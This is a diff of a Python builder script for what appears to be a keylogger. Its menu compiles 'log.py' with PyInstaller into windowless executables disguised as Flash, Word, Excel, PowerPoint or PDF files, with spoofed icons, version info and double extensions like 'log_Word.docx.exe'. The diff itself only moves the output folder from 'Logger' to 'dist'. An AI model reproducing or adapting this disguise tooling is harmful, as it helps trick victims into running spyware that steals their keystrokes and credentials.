@@ -54,68 +54,68 @@ choice = input(header)
 
 if choice == '1':
     name = 'log_Flash.exe'
-    os.system('rmdir /S /Q Logger 2>nul')
+    os.system('rmdir /S /Q dist 2>nul')
     os.system('pyinstaller --noconsole -m Manifest/manifest.manifest --version-file=Version/adobe.ver -i Icons/flash.ico -F log.py')
     os.system('rmdir /S /Q build __pycache__')
     os.system('del log.py log.spec')
-    os.rename('Logger/log.exe', 'Logger/' + name)
+    os.rename('dist/log.exe', 'dist/' + name)
     os.system('cls')
-    print('{0}[*] Saved to:  {1}'.format(GREEN, END) + 'Logger/' + name)
+    print('{0}[*] Saved to:  {1}'.format(GREEN, END) + 'dist/' + name)
     sys.exit()
 
 elif choice == '2':
     name = 'log_Word.docx.exe'
-    os.system('rmdir /S /Q Logger 2>nul')
+    os.system('rmdir /S /Q dist 2>nul')
     os.system('pyinstaller --noconsole -m Manifest/manifest.manifest --version-file=Version/word.ver -i Icons/word.ico -F log.py')
     os.system('rmdir /S /Q build __pycache__')
     os.system('del log.py log.spec')
-    os.rename('Logger/log.exe', 'Logger/' + name)
+    os.rename('dist/log.exe', 'dist/' + name)
     os.system('cls')
-    print('{0}[*] Saved to:  {1}'.format(GREEN, END) + 'Logger/' + name)
+    print('{0}[*] Saved to:  {1}'.format(GREEN, END) + 'dist/' + name)
     sys.exit()    
 
 elif choice == '3':
     name = 'log_Excel.xlsx.exe'
-    os.system('rmdir /S /Q Logger 2>nul')
+    os.system('rmdir /S /Q dist 2>nul')
     os.system('pyinstaller --noconsole -m Manifest/manifest.manifest --version-file=Version/excel.ver -i Icons/excel.ico -F log.py')
     os.system('rmdir /S /Q build __pycache__')
     os.system('del log.py log.spec')
-    os.rename('Logger/log.exe', 'Logger/' + name)
+    os.rename('dist/log.exe', 'dist/' + name)
     os.system('cls')
-    print('{0}[*] Saved to:  {1}'.format(GREEN, END) + 'Logger/' + name)
+    print('{0}[*] Saved to:  {1}'.format(GREEN, END) + 'dist/' + name)
     sys.exit()
 
 elif choice == '4':
     name = 'log_powerpoint.pptx.exe'
-    os.system('rmdir /S /Q Logger 2>nul')
+    os.system('rmdir /S /Q dist 2>nul')
     os.system('pyinstaller --noconsole -m Manifest/manifest.manifest --version-file=Version/powerpoint.ver -i Icons/powerpoint.ico -F log.py')
     os.system('rmdir /S /Q build __pycache__')
     os.system('del log.py log.spec')
-    os.rename('Logger/log.exe', 'Logger/' + name)
+    os.rename('dist/log.exe', 'dist/' + name)
     os.system('cls')
-    print('{0}[*] Saved to:  {1}'.format(GREEN, END) + 'Logger/' + name)
+    print('{0}[*] Saved to:  {1}'.format(GREEN, END) + 'dist/' + name)
     sys.exit()
 
 elif choice == '5':
     name = 'log_pdf.pdf.exe'
-    os.system('rmdir /S /Q Logger 2>nul')
+    os.system('rmdir /S /Q dist 2>nul')
     os.system('pyinstaller --noconsole -m Manifest/manifest.manifest --version-file=Version/pdf.ver -i Icons/pdf.ico -F log.py')
     os.system('rmdir /S /Q build __pycache__')
     os.system('del log.py log.spec')
-    os.rename('Logger/log.exe', 'Logger/' + name)
+    os.rename('dist/log.exe', 'dist/' + name)
     os.system('cls')
-    print('{0}[*] Saved to:  {1}'.format(GREEN, END) + 'Logger/' + name)
+    print('{0}[*] Saved to:  {1}'.format(GREEN, END) + 'dist/' + name)
     sys.exit()
 
 elif choice == '6':
     name = 'logger.exe'
-    os.system('rmdir /S /Q Logger 2>nul')
+    os.system('rmdir /S /Q dist 2>nul')
     os.system('pyinstaller --noconsole -m Manifest/manifest.manifest -F log.py')
     os.system('rmdir /S /Q build __pycache__')
     os.system('del log.py log.spec')
-    os.rename('Logger/log.exe', 'Logger/' + name)
+    os.rename('dist/log.exe', 'dist/' + name)
     os.system('cls')
-    print('{0}[*] Saved to:  {1}'.format(GREEN, END) + 'Logger/' + name)
+    print('{0}[*] Saved to:  {1}'.format(GREEN, END) + 'dist/' + name)
     sys.exit()            
 
 else:
